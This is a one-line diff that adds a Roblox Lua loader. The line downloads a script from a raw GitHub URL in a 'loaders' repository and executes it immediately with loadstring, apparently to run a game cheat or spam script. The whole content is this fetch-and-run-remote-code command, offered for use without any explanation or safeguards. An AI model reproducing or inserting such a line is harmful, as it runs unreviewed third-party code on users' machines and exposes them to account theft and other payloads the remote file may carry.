@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SlowDamselLog/loaders/main/loaders/ea-combined-arms-spam7-s2yip4vkoevu1j.lua"))()
